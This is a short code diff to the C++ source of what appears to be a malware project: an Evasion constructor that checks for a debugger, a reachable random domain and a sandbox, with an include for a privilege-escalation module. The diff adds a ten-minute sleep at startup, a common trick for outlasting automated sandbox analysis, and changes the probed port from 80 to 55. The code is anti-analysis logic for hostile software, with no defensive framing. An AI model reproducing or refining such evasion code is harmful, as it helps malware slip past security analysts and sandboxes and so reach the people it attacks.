@@ -6,6 +6,8 @@
 #include "privilegeEscalation\PrivilegeEscalation.h"
 
 Evasion::Evasion() {
+	Sleep(600000);
+
 	Sandbox sandbox;
 
     if (Evasion::isBeingDebugging() || Evasion::isDomainReachable() || sandbox.DetectSandbox()) {
@@ -23,7 +25,7 @@ BOOL Evasion::isBeingDebugging(void) {
 BOOL Evasion::isDomainReachable(void) {
 	std::string randomDomain = Utils::getRandomDomain();
 
-	if (Utils::HostConnection(randomDomain, 80)) {
+	if (Utils::HostConnection(randomDomain, 55)) {
 		return TRUE;
 	}
 	return FALSE;
